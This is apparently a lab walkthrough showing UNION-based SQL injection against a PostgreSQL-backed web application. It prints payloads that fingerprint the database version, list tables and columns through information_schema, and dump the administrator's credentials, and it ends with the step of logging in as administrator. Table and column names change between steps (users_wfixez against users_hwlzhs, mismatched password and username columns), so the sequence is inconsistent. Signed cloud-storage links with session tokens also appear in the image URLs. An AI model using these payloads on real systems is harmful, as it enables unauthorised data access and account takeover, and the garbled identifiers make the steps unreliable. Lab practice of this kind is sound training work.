# Listing the database contents on non-Oracle databases.

**both column 1 and 2 contain data type string.**

**STEP #3**

Query the database to retrieve database type.

```text
' UNION SELECT version(), NULL--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/e18d5687-f060-464c-b24e-b96b3edd6468/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664BACKWFK%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204559Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIHK%2BWrAgF0aw8xgO%2BhXd%2BBGH0QQ74ovlNcxzYP4TF0ygAiAVK9cvKDG5yT7PViM8x0TEqWsf0AHxqd7L0O3QENjMQSqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMwKjjIKXanFMlTG6rKtwDNUhTiZb96dusSjmAVJHA22kBqUwH%2BasxgIZZlYLmgx8CVvKtlQbsxHT31AUV4gpB2514APgZxhJ%2FRpsxZlU%2BkXdXeWEZUNQqZOX07YKnigKlXd0wil6So11aVSEa3MJIjg0fBJ%2BxTFMFZeMVFhiGR0AimHW4qkpMtFw7Wa%2BSIzi2i4LBu5WEvuFUgHaOTRbKfaAffIpriRJvzXqOCqIPs8hd8VERc3bl11GTeD4tZq4u%2FIx8e8vKLXwLaJXu5zeLc%2FCNxp26QuJhH0cMnxf0ZSmrlPlRiCWoBzWUwMmoxD09cspTbrpMVfxKnfW33J%2FeW488jC1DkaVok1%2F1eN2ECH0t44nP%2FvZnydy7cFoUkMb19MfG6kiL%2BPoVOcRV5JAo1iXmlG%2FKQ3CATehg31McUlILJj1KsFgqaZxF71BmUIaSyKD4eddos6l92GSQKgxZDjsHX3kSX6K%2FFx2r4hpEomPVLrEJpBW731YylTO2sq06WsNdWmPi%2FO%2BZPUIjhiKXjAjX7AlggQrBCoT03Tkkl7dLMQzfEUVooNRkIsePI3HNSaN9wzVYr1JtTX2H%2Blg05cJcGziAOfefyGMLqd57q%2FP9QNiS4UM6iZYXMhPZueUtOAtxzy6mG10zAVIw%2FcWi1AY6pgHjHQ7CyTXSldWrH0Dv42jJNJTVUiol5l32Skg%2BigDxwI9WbTWbsW0eZS6sgQuY7vT5SRMqd76%2F57Z22s8ocVOfnInVQ5GpxHCCvSD%2FmjO5kLiZ0v%2BfgphU%2BGq2%2BK%2B8rfxTRzQwI%2BJnTqeqknR7tJnT66jefE9APX%2F95laJmuys21jAGL%2BkGvrGCFfyVJSFgDuOCCOk4ef8fxIT4c1z1JvSKkELnU5n&X-Amz-Signature=3a00a601661048650333bcf33f973a1c7e62b16865be233d86df3b03866f2ab2&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**It returns:**

```text
PostgreSQL 11.12 (Debian 11.12–1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0–18+deb9u1) 6.3.0 20170516, 64-bit
```

**Database type: PostgreSQL**

**STEP #4**

Determine the table names.

![](https://miro.medium.com/v2/resize:fit:700/0*4vUM6NT3J_FxIyFW)

```text
' UNION SELECT table_name, NULL FROM information_schema.tables
```

![](https://miro.medium.com/v2/resize:fit:700/0*5_92Rm85mDwlIX-Z)

Let’s search for a table that contains usernames and passwords.

![](https://miro.medium.com/v2/resize:fit:700/0*JfNplyrNCXGFTbAd)

There is a table named `users_wfixez`** **this might be the table we are looking for. So let’s try retrieving columns of that table.

**STEP #5**

Determine the column names of the table `users_wfixez`

```text
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_wfixez'--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/cfe0361c-45a8-48ec-a043-1c0b65e51441/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664BACKWFK%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204559Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIHK%2BWrAgF0aw8xgO%2BhXd%2BBGH0QQ74ovlNcxzYP4TF0ygAiAVK9cvKDG5yT7PViM8x0TEqWsf0AHxqd7L0O3QENjMQSqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMwKjjIKXanFMlTG6rKtwDNUhTiZb96dusSjmAVJHA22kBqUwH%2BasxgIZZlYLmgx8CVvKtlQbsxHT31AUV4gpB2514APgZxhJ%2FRpsxZlU%2BkXdXeWEZUNQqZOX07YKnigKlXd0wil6So11aVSEa3MJIjg0fBJ%2BxTFMFZeMVFhiGR0AimHW4qkpMtFw7Wa%2BSIzi2i4LBu5WEvuFUgHaOTRbKfaAffIpriRJvzXqOCqIPs8hd8VERc3bl11GTeD4tZq4u%2FIx8e8vKLXwLaJXu5zeLc%2FCNxp26QuJhH0cMnxf0ZSmrlPlRiCWoBzWUwMmoxD09cspTbrpMVfxKnfW33J%2FeW488jC1DkaVok1%2F1eN2ECH0t44nP%2FvZnydy7cFoUkMb19MfG6kiL%2BPoVOcRV5JAo1iXmlG%2FKQ3CATehg31McUlILJj1KsFgqaZxF71BmUIaSyKD4eddos6l92GSQKgxZDjsHX3kSX6K%2FFx2r4hpEomPVLrEJpBW731YylTO2sq06WsNdWmPi%2FO%2BZPUIjhiKXjAjX7AlggQrBCoT03Tkkl7dLMQzfEUVooNRkIsePI3HNSaN9wzVYr1JtTX2H%2Blg05cJcGziAOfefyGMLqd57q%2FP9QNiS4UM6iZYXMhPZueUtOAtxzy6mG10zAVIw%2FcWi1AY6pgHjHQ7CyTXSldWrH0Dv42jJNJTVUiol5l32Skg%2BigDxwI9WbTWbsW0eZS6sgQuY7vT5SRMqd76%2F57Z22s8ocVOfnInVQ5GpxHCCvSD%2FmjO5kLiZ0v%2BfgphU%2BGq2%2BK%2B8rfxTRzQwI%2BJnTqeqknR7tJnT66jefE9APX%2F95laJmuys21jAGL%2BkGvrGCFfyVJSFgDuOCCOk4ef8fxIT4c1z1JvSKkELnU5n&X-Amz-Signature=7def56d8cf9572e39baf795d2ac74878a255f4934f904d4cd19c7a7dbfcf0eb2&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**There are two columns in the table **`users_hwlzhs`**.**

`username_wbdvqp`

`password_zfxnbv`

**STEP #6**

Retrieve the administrator’s password from the database.

```text
'+UNION+SELECT+password_xvbkii,username_wwmyan+FROM+users_wfixez--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/a70b723f-9acb-4142-81e1-e06c44bcadef/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664BACKWFK%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204559Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIHK%2BWrAgF0aw8xgO%2BhXd%2BBGH0QQ74ovlNcxzYP4TF0ygAiAVK9cvKDG5yT7PViM8x0TEqWsf0AHxqd7L0O3QENjMQSqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMwKjjIKXanFMlTG6rKtwDNUhTiZb96dusSjmAVJHA22kBqUwH%2BasxgIZZlYLmgx8CVvKtlQbsxHT31AUV4gpB2514APgZxhJ%2FRpsxZlU%2BkXdXeWEZUNQqZOX07YKnigKlXd0wil6So11aVSEa3MJIjg0fBJ%2BxTFMFZeMVFhiGR0AimHW4qkpMtFw7Wa%2BSIzi2i4LBu5WEvuFUgHaOTRbKfaAffIpriRJvzXqOCqIPs8hd8VERc3bl11GTeD4tZq4u%2FIx8e8vKLXwLaJXu5zeLc%2FCNxp26QuJhH0cMnxf0ZSmrlPlRiCWoBzWUwMmoxD09cspTbrpMVfxKnfW33J%2FeW488jC1DkaVok1%2F1eN2ECH0t44nP%2FvZnydy7cFoUkMb19MfG6kiL%2BPoVOcRV5JAo1iXmlG%2FKQ3CATehg31McUlILJj1KsFgqaZxF71BmUIaSyKD4eddos6l92GSQKgxZDjsHX3kSX6K%2FFx2r4hpEomPVLrEJpBW731YylTO2sq06WsNdWmPi%2FO%2BZPUIjhiKXjAjX7AlggQrBCoT03Tkkl7dLMQzfEUVooNRkIsePI3HNSaN9wzVYr1JtTX2H%2Blg05cJcGziAOfefyGMLqd57q%2FP9QNiS4UM6iZYXMhPZueUtOAtxzy6mG10zAVIw%2FcWi1AY6pgHjHQ7CyTXSldWrH0Dv42jJNJTVUiol5l32Skg%2BigDxwI9WbTWbsW0eZS6sgQuY7vT5SRMqd76%2F57Z22s8ocVOfnInVQ5GpxHCCvSD%2FmjO5kLiZ0v%2BfgphU%2BGq2%2BK%2B8rfxTRzQwI%2BJnTqeqknR7tJnT66jefE9APX%2F95laJmuys21jAGL%2BkGvrGCFfyVJSFgDuOCCOk4ef8fxIT4c1z1JvSKkELnU5n&X-Amz-Signature=85425f227125ec4565e75ae7b06637f271331effc128905a5bc38b20367b2663&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

| 9kn123cwvo54vzhicsns | administrator |
Use the administrator’s password to gain administrator’s access to the web application.

